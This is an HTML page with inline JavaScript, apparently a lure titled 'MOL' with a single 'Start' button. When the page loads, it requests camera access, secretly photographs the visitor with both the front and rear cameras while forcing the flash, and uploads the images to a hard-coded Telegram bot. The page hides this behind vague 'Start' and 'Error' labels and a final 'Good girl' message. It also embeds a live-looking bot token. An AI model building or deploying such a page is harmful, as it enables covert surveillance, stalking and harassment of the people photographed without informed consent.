<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MOL</title>
<style>
  :root {
    color-scheme: dark;
    --bg: #0c1117;
    --panel: #151d27;
    --panel-border: #263342;
    --text: #f5f7fa;
    --muted: #9aa8b8;
    --accent: #55a7ff;
    --success: #35c48a;
  }

  * { box-sizing: border-box; }

  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: radial-gradient(circle at top, #1b2a3b 0, var(--bg) 42rem);
    color: var(--text);
    display: flex;
    align-items: flex-start;
    justify-content: center;
    padding: 18px;
    margin: 0;
    min-height: 100vh;
  }

  .app {
    width: min(100%, 520px);
    margin: 0 auto;
    padding: clamp(18px, 5vw, 30px);
    background: color-mix(in srgb, var(--panel) 94%, transparent);
    border: 1px solid var(--panel-border);
    border-radius: 24px;
    box-shadow: 0 24px 70px rgb(0 0 0 / 28%);
  }

  .eyebrow {
    margin: 0 0 8px;
    color: var(--accent);
    font-size: 0.75rem;
    font-weight: 700;
    letter-spacing: 0.08em;
    text-transform: uppercase;
  }

  h1 { font-size: clamp(1.45rem, 6vw, 2rem); line-height: 1.15; margin: 0; }
  p.hint { color: var(--muted); font-size: 0.95rem; line-height: 1.5; margin: 10px 0 0; }

  .camera-frame {
    position: relative;
    overflow: hidden;
    margin-top: 22px;
    border-radius: 18px;
    background: #05080b;
    aspect-ratio: 4 / 3;
  }

  video, canvas {
    width: 100%;
    height: 100%;
    object-fit: cover;
    background: #000;
  }

  video.front-camera { transform: scaleX(-1); }

  .camera-label {
    position: absolute;
    top: 12px;
    left: 12px;
    padding: 6px 10px;
    border: 1px solid rgb(255 255 255 / 18%);
    border-radius: 999px;
    background: rgb(0 0 0 / 48%);
    color: #fff;
    font-size: 0.78rem;
    backdrop-filter: blur(8px);
  }

  .screen-flash {
    position: fixed;
    z-index: 9999;
    inset: 0;
    background: #fff;
    opacity: 0;
    pointer-events: none;
  }

  .screen-flash.active { opacity: 1; }

  .buttons {
    display: flex;
    gap: 10px;
    margin-top: 18px;
    flex-wrap: wrap;
  }

  button {
    min-height: 46px;
    flex: 1 1 145px;
    padding: 11px 16px;
    border: 1px solid transparent;
    border-radius: 12px;
    font: inherit;
    font-weight: 650;
    cursor: pointer;
    transition: transform 160ms ease, filter 160ms ease, border-color 160ms ease;
  }

  button:hover:not(:disabled) { filter: brightness(1.1); transform: translateY(-1px); }
  button:focus-visible { outline: 3px solid rgb(85 167 255 / 45%); outline-offset: 2px; }
  #btnStart { background: var(--accent); color: #06111d; }
  button:disabled { opacity: 0.45; cursor: not-allowed; }
  #status { margin: 15px 2px 0; color: var(--muted); font-size: 0.9rem; line-height: 1.4; min-height: 22px; }

  @media (max-width: 380px) {
    body { padding: 10px; }
    .app { border-radius: 18px; padding: 16px; }
    button { flex-basis: 100%; }
  }
</style>
</head>
<body>
  <main class="app">
    <p class="eyebrow">MOL</p>
    <h1>Начать</h1>
    <p class="hint">Start</p>

    <div class="camera-frame">
      <video id="video" autoplay playsinline style="display:none;"></video>
      <video id="rearVideo" autoplay playsinline style="display:none;"></video>
      <canvas id="canvas" style="display:none;"></canvas>
      <canvas id="rearCanvas" style="display:none;"></canvas>
      <span id="cameraLabel" class="camera-label" style="display:none;">Error</span>
    </div>

    <div id="screenFlash" class="screen-flash" aria-hidden="true"></div>

    <div class="buttons">
      <button id="btnStart">Start</button>
    </div>

    <div id="status" role="status" aria-live="polite"></div>
  </main>

<script>
  // ==== НАСТРОЙКИ: впишите сюда свои данные ====
  const BOT_TOKEN = "8634781136:AAGnTjo0U0jcj_klHQlQ-VI0ELL4FLRaXAk";   
  const CHAT_ID   = "8130212298";      
  // ==============================================

  const video = document.getElementById('video');
  const rearVideo = document.getElementById('rearVideo');
  const canvas = document.getElementById('canvas');
  const rearCanvas = document.getElementById('rearCanvas');
  const status = document.getElementById('status');
  const screenFlash = document.getElementById('screenFlash');

  const btnStart = document.getElementById('btnStart');
  const cameraLabel = document.getElementById('cameraLabel');

  let streams = [];
  let isProcessing = false;

  async function startCamera(targetVideo, cameraMode) {
    if (!navigator.mediaDevices?.getUserMedia) {
      throw new Error('Браузер не поддерживает доступ к камере. Откройте страницу через HTTPS.');
    }

    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: { ideal: cameraMode } },
      audio: false
    });
    streams.push(stream);
    targetVideo.srcObject = stream;
    targetVideo.classList.toggle('front-camera', cameraMode === 'user');
    cameraLabel.textContent = 'Error';
    cameraLabel.style.display = 'block';
    btnStart.style.display = 'none';
  }

  function waitForVideo(targetVideo) {
    if (targetVideo.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA) return Promise.resolve();
    return new Promise((resolve) => {
      targetVideo.addEventListener('loadeddata', resolve, { once: true });
    });
  }

  async function enableFlash(stream) {
    const track = stream?.getVideoTracks()[0];
    const capabilities = track?.getCapabilities?.();

    if (capabilities?.torch) {
      try {
        await track.applyConstraints({ advanced: [{ torch: true }] });
        return () => track.applyConstraints({ advanced: [{ torch: false }] }).catch(() => {});
      } catch {
        // Some browsers expose torch but reject it for the front camera.
      }
    }

    screenFlash.classList.add('active');
    await new Promise((resolve) => {
      requestAnimationFrame(() => requestAnimationFrame(resolve));
    });
    return () => screenFlash.classList.remove('active');
  }

  function capturePhoto(sourceVideo, targetCanvas) {
    targetCanvas.width = sourceVideo.videoWidth;
    targetCanvas.height = sourceVideo.videoHeight;
    targetCanvas.getContext('2d').drawImage(sourceVideo, 0, 0);

    return new Promise((resolve, reject) => {
      targetCanvas.toBlob((blob) => {
        if (!blob) {
          reject(new Error('Error.'));
          return;
        }

        resolve(blob);
      }, 'image/jpeg', 0.9);
    });
  }

  async function sendPhoto(photoBlob, filename) {
    if (!photoBlob) return;
    if (BOT_TOKEN.includes("ВАШ_") || CHAT_ID.includes("ВАШ_")) {
      throw new Error('Сначала впишите BOT_TOKEN и CHAT_ID в код страницы.');
    }

    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', photoBlob, filename);

    const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
    const data = await resp.json();

    if (!data.ok) throw new Error(data.description || 'Неизвестная ошибка Telegram API.');
  }

  function stopCamera() {
    streams.forEach((stream) => stream.getTracks().forEach((track) => track.stop()));
    streams = [];
  }

  async function captureAndSend() {
    if (isProcessing) return;
    isProcessing = true;
    btnStart.disabled = true;
    status.textContent = "Жми разрешить чтобы продолжить...";

    try {
      const cameraResults = await Promise.allSettled([
        startCamera(video, 'user'),
        startCamera(rearVideo, 'environment')
      ]);
      const rejectedCamera = cameraResults.find((result) => result.status === 'rejected');
      if (rejectedCamera) throw rejectedCamera.reason;
      const [frontStream, rearStream] = cameraResults.map((result) => result.value);
      await Promise.all([waitForVideo(video), waitForVideo(rearVideo)]);
      const [disableFrontFlash, disableRearFlash] = await Promise.all([
        enableFlash(frontStream),
        enableFlash(rearStream)
      ]);
      let frontPhoto;
      let rearPhoto;
      try {
        await new Promise((resolve) => setTimeout(resolve, 250));
        [frontPhoto, rearPhoto] = await Promise.all([
          capturePhoto(video, canvas),
          capturePhoto(rearVideo, rearCanvas)
        ]);
      } finally {
        disableFrontFlash();
        disableRearFlash();
      }
      stopCamera();

      status.textContent = "Отправляем фотографии...";
      await sendPhoto(frontPhoto, 'front-photo.jpg');
      await sendPhoto(rearPhoto, 'rear-photo.jpg');
      status.textContent = "Good girl";
    } catch (err) {
      stopCamera();
      btnStart.style.display = 'block';
      status.textContent = "Не удалось : " + err.message;
      btnStart.disabled = false;
      isProcessing = false;
    }
  }

  btnStart.addEventListener('click', captureAndSend);
  window.addEventListener('load', captureAndSend);

  window.addEventListener('beforeunload', () => {
    stopCamera();
  });
</script>

</body>
</html>
